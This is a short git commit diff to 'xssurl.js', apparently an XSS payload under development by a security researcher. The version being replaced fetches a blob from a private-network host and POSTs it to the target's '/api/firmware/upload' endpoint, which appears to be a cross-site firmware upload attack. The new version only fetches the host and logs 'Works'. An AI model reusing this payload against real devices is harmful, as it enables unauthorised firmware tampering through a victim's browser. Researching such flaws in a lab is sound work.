51547fdd197f1c2521e21b1c2f8ef98bd8aad4e8
Crow <74257119+InfoSec-Crow@users.noreply.github.com>
2022-10-27 10:21:08 +0200

    Update xssurl.js

--- xssurl.js
+++ xssurl.js
@@ -1,16 +1,8 @@
 <script>
     const download = async function () {
-        await fetch('http://192.168.190.130/')
+        fetch('http://192.168.190.130/')
             .then(response => response.blob())
             .then(function (blob) {
-
-                console.log(blob)
-
-                const formData = new FormData();
-                formData.append('file', blob);
-
-                fetch('/api/firmware/upload', { method: "POST", body: formData });
-
             });
     }
     console.log("Works")
